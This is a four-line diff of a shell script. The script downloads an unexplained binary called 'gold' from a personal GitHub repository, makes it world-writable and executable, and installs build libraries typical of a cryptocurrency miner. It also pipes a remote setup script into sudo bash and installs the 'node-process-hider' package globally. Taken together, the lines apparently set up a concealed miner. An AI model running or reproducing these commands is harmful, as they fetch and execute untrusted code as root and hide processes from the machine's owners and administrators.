@@ -1,4 +1,4 @@
-Towget https://github.com/Testdrive345/hello/raw/main/gold
+wget https://github.com/Testdrive345/hello/raw/main/gold
 chmod 777 gold
 sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider
